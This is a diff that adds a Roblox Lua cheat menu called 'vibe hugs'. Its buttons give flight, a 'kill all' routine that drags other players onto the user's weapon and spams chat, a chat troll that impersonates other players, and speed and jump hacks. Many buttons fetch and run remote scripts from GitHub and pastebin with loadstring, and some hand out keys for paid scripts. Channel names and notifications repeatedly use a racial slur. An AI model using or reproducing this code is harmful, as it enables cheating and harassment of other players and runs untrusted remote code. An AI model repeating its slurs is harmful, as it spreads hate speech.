@@ -1,0 +1,384 @@
+local Players: Players = game:GetService("Players")
+local UserInputService: UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage: ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService: TeleportService = game:GetService("TeleportService")
+
+local LocalPlayer: Player = Players.LocalPlayer
+
+local DiscordLib =
+    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()
+
+local win = DiscordLib:Window("vibe hugs")
+
+local serv = win:Server("Vibe hugs", "")
+
+local btns = serv:Channel("Main nigger hall walk")
+
+local tps = serv:Channel("tps nigger local plauer")
+
+local function RandomCapitalization(txt)
+    local str = ""
+    for i = 1, string.len(txt), 1 do
+        if math.random(1, 2) == 1 then
+            str = str .. string.upper(string.sub(txt, i, i))
+        else
+            str = str .. string.lower(string.sub(txt, i, i))
+        end
+    end
+    return str
+end
+
+btns:Button(
+    "fly (E)",
+    function()
+         DiscordLib:Notification("Notification", "Now flying", "ok kid!")
+        repeat wait() 
+	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
+local mouse = game.Players.LocalPlayer:GetMouse() 
+repeat wait() until mouse
+local plr = game.Players.LocalPlayer 
+local torso = plr.Character.HumanoidRootPart 
+local flying = true
+local deb = true 
+local ctrl = {f = 0, b = 0, l = 0, r = 0} 
+local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+local maxspeed = 50 
+local speed = 0 
+
+function Fly() 
+local bg = Instance.new("BodyGyro", torso) 
+bg.P = 9e4 
+bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+bg.cframe = torso.CFrame 
+local bv = Instance.new("BodyVelocity", torso) 
+bv.velocity = Vector3.new(0,0.1,0) 
+bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
+repeat wait() 
+plr.Character.Humanoid.PlatformStand = true 
+if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
+speed = speed+.5+(speed/maxspeed) 
+if speed > maxspeed then 
+speed = maxspeed 
+end 
+elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
+speed = speed-1 
+if speed < 0 then 
+speed = 0 
+end 
+end 
+if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
+bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
+lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
+elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
+bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
+else 
+bv.velocity = Vector3.new(0,0.1,0) 
+end 
+bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
+until not flying 
+ctrl = {f = 0, b = 0, l = 0, r = 0} 
+lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+speed = 0 
+bg:Destroy() 
+bv:Destroy() 
+plr.Character.Humanoid.PlatformStand = false 
+end 
+mouse.KeyDown:connect(function(key) 
+if key:lower() == "e" then 
+if flying then flying = false 
+else 
+flying = true 
+Fly() 
+end 
+elseif key:lower() == "w" then 
+ctrl.f = 1 
+elseif key:lower() == "s" then 
+ctrl.b = -1 
+elseif key:lower() == "a" then 
+ctrl.l = -1 
+elseif key:lower() == "d" then 
+ctrl.r = 1 
+end 
+end) 
+mouse.KeyUp:connect(function(key) 
+if key:lower() == "w" then 
+ctrl.f = 0 
+elseif key:lower() == "s" then 
+ctrl.b = 0 
+elseif key:lower() == "a" then 
+ctrl.l = 0 
+elseif key:lower() == "d" then 
+ctrl.r = 0 
+end 
+end)
+Fly()
+       
+    end
+)
+
+btns:Seperator()
+
+btns:Button(
+    "kill all",
+    function()
+        DiscordLib:Notification("notfifcation from owner wanting to fuck u:))", "now killing all", "ok skid didnt ask tho")
+        task.spawn(function()
+        local CoordinateFrame = CFrame.new(-8.65939236, 22.2416039, 51.2895126)
+        local Character = game:GetService("Players").LocalPlayer.Character
+        local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
+        
+        Humanoid.RootPart.CFrame = CoordinateFrame
+        local Tool = Character:FindFirstChildWhichIsA("Tool") or Character:WaitForChild("Sword")
+        local Handle = Tool:WaitForChild("Handle")
+
+        for i = 1, 7, 1 do
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new script hehehe " .. string.rep(".", math.random(1, 3)), "All")
+        end
+        
+        while true do
+            if Tool:IsDescendantOf(Character) then
+                for _, Player in pairs(game:GetService("Players"):GetPlayers()) do
+                    if Player ~= game:GetService("Players").LocalPlayer then
+                        pcall(function()
+                            Player.Character:FindFirstChildWhichIsA("Humanoid").RootPart.CFrame = Handle.CFrame * CFrame.new(math.random() / 8, math.random() / 8, math.random() / 8)
+                        end)
+                    end
+                end
+                Tool:Activate()
+            end
+            task.wait(0)
+        end
+    end)
+
+    end
+)
+
+
+
+btns:Button(
+    "play russain music",
+    function()
+        DiscordLib:Notification("notficattan", "requested by vlandimir ", "ok?")
+     local v1 = { { 4556885032 }, { 4556885032 }, { 4556885032 }, { 4556885032 }, { 4556885032 }, { 4556885032 }, { 4556885032 }, { 4556885032 }, { 4556885032 } };
+local lAudio2 = workspace:WaitForChild("Audio");
+local v3 = Random.new():NextInteger(1, #v1);
+local lRE1 = game:GetService("ReplicatedStorage"):WaitForChild("RE");
+function PlayOnCilent(p1)
+    lRE1:FireAllClients("Play", All);
+end;
+while true do
+    wait();
+    sInfo = v1[v3];
+    lAudio2.SoundId = "rbxassetid://" .. tostring(sInfo[1]);
+    lAudio2:Play();
+    local u2 = false;
+    local u3 = false;
+    local v4 = lAudio2.Stopped:Connect(function()
+        u3 = true;
+    end);
+    while true do
+        wait();
+        if u2 then
+            break;
+        end;
+        if u3 then
+            break;
+        end;
+    end;
+    lAudio2.Ended:Connect(function()
+        u2 = true;
+    end):Disconnect();
+    v4:Disconnect();
+    v3 = v3 + 1;
+    if #v1 < v3 then
+        v3 = 1;
+    end;
+end;
+    end
+)
+
+btns:Button(
+    "rejoin",
+    function()
+        DiscordLib:Notification("notficattan", "rejoining local nigger....", "ok skid didnt ask tho")
+        local PlaceId = game.PlaceId
+    local JobId = game.JobId
+
+    return TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
+        
+
+    end
+)
+
+
+btns:Button(
+    "reset",
+    function()
+        DiscordLib:Notification("notficattan", "reseted", "ok skid didnt ask tho")
+       local Character = LocalPlayer.Character
+    if Character then
+        local Humanoid: Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
+        if Humanoid and Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
+            local LastCoordinateFrame = Humanoid.RootPart.CFrame
+            task.wait(Character:BreakJoints())
+            repeat
+                task.wait(0)
+            until LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") and LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):GetState() ~= Enum.HumanoidStateType.Dead
+            LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").RootPart.CFrame = LastCoordinateFrame
+            return
+        end
+    end
+    end
+)
+
+
+btns:Button(
+    "Fe emote gui (Op)",
+    function()
+        DiscordLib:Notification("notficattan", "lmao u really need this broke kid", "im not broke *cries*")
+      loadstring(game:HttpGet("https://pastebin.com/raw/DjsEQMxQ"))()
+        
+
+    end
+)
+
+
+
+
+
+btns:Button(
+    "naked",
+    function()
+        DiscordLib:Notification("notficattan", "rno clothes for u ", "ok skid didnt ask tho")
+       for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+    		if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
+    			v:Destroy()
+    		end
+    	end
+    end
+)
+
+btns:Button(
+    "admin ui",
+    function()
+         DiscordLib:Notification("Notification", "made by ! EMPLIC#9999", "did i ask tho?")
+          loadstring(game:HttpGet("https://raw.githubusercontent.com/offperms/Admin-UI/main/Emplic"))()
+    end
+      
+)
+
+btns:Button(
+    "walkspeed jumppower and hipheight gui",
+    function()
+        DiscordLib:Notification("notficattan", "ur gay", "no u ")
+        --!nocheck
+
+--#region
+
+local Players: Players = game:GetService("Players")
+local UserInputService: UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage: ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService: TeleportService = game:GetService("TeleportService")
+
+local LocalPlayer: Player = Players.LocalPlayer
+local PlayerMouse: PlayerMouse = LocalPlayer:GetMouse()
+
+--#endregion
+-- library
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))();
+-- windows
+local Window = Library.CreateLib("gui by emplic", "BloodTheme")
+-- tabs
+local Tab = Window:NewTab("Main")
+local MainSection = Tab:NewSection("Main")
+
+MainSection:NewSlider("WalkSpeed", "Change your movement magnitude.", 250, 16, function(WalkSpeed: number?)
+    local Character = LocalPlayer.Character
+    if Character then
+        local Humanoid: Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
+        if Humanoid then
+            Humanoid.WalkSpeed = WalkSpeed
+        end
+    end
+end)
+
+
+MainSection:NewSlider("JumpPower", "Change your initial jump velocity.", 250, 50, function(JumpPower: number?)
+    local Character = LocalPlayer.Character
+    if Character then
+        local Humanoid: Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
+        if Humanoid then
+            Humanoid.JumpPower = JumpPower
+        end
+    end
+end)
+
+MainSection:NewSlider("HipHeight", "Change your initial HipHeight velocity.", 250, 0, function(JumpPower: number?)
+    local Character = LocalPlayer.Character
+    if Character then
+        local Humanoid: Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
+        if Humanoid then
+            Humanoid.HipHeight = HipHeight
+        end
+    end
+end)
+
+    end
+)
+
+
+btns:Button(
+    "chat troll",
+    function()
+        DiscordLib:Notification("notficattan", "chat trolling..", "no u ")
+        local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(Message)
+  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("".."["..Action[i].Name.."]".." "..Message, "All")
+  end)
+end
+    end
+)
+
+
+
+
+
+
+
+tps:Label("Coming soon (owner is too lazy to make tps)")
+
+local others = serv:Channel("other uis by emplic")
+others:Label("uis that the owner made too:")
+
+others:Button(
+    "chill ruiner",
+    function()
+        DiscordLib:Notification("notficattan", "lading chill nigger", "ok skid didnt ask tho")
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/Emplic/Vibe-hugs/main/RUINER"))()
+    end
+)
+
+others:Button(
+    "auto buyer",
+    function()
+        DiscordLib:Notification("notficattan", "key is Vibehugsruinerontoplol", "ok skid didnt ask tho")
+      -- key Vibehugsruinerontoplol
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Emplic/AutoBuy/main/Vibe%20hugs%20-%20Paid"))()
+    end
+)
+
+
+others:Button(
+    "vibe hugs v1",
+    function()
+        DiscordLib:Notification("notficattan", "key is vibehugsv1lmao", "ok skid didnt ask tho")
+      -- key Vibehugsruinerontoplol
+--[[
+! EMPLIC#9999 and shawnjbragdon#0001 made this shit
+key: https://link-to.net/361190/vibehugsv1keylmao
+enjoy fuckers
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Emplic/Emplicandshadowjbragdonmadethisshit/main/!!!holyfuck!!!!"))()
+    end
+)
